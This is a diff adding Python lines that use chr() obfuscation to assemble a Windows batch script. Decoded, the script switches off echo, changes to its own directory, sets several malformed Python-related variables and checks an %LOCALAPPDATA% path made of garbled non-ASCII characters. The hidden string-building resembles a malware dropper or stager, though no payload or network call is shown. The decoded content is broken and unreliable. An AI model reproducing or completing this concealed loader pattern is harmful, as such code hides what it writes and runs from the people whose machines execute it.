@@ -1,0 +1,9 @@
+amp=chr(38)
+n=chr(13)+chr(10)
+L=[]
+L.append(chr(64)+chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(111)+chr(102)+chr(102)+n)
+L.append(chr(99)+chr(100)+chr(32)+chr(47)+chr(100)+chr(32)+chr(34)+chr(37)+chr(126)+chr(100)+chr(112)+chr(48)+chr(34)+n)
+L.append(chr(115)+chr(101)+chr(116)+chr(32)+chr(80)+chr(89)+chr(84)+chr(72)+chr(79)+chr(61)+chr(49)+n)
+L.append(chr(115)+chr(101)+chr(116)+chr(32)+chr(80)+chr(89)+chr(84)+chr(72)+chr(79)+chr(65)+chr(68)+chr(73)+chr(78)+chr(71)+chr(61)+chr(117)+chr(116)+chr(102)+chr(45)+chr(56)+n)
+L.append(chr(115)+chr(101)+chr(116)+chr(32)+chr(80)+chr(89)+chr(84)+chr(72)+chr(79)+chr(78)+chr(101)+chr(100)+chr(101)+chr(110)+chr(116)+chr(95)+chr(69)+chr(88)+chr(69)+chr(61)+n)
+L.append(chr(105)+chr(102)+chr(32)+chr(101)+chr(120)+chr(105)+chr(115)+chr(116)+chr(32)+chr(37)+chr(76)+chr(79)+chr(67)+chr(65)+chr(76)+chr(65)+chr(80)+chr(80)+chr(68)+chr(65)+chr(84)+chr(65)+chr(37)+chr(252)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+chr(37)+chr(252)+chr(100)+chr(228)+chr(100)+n)
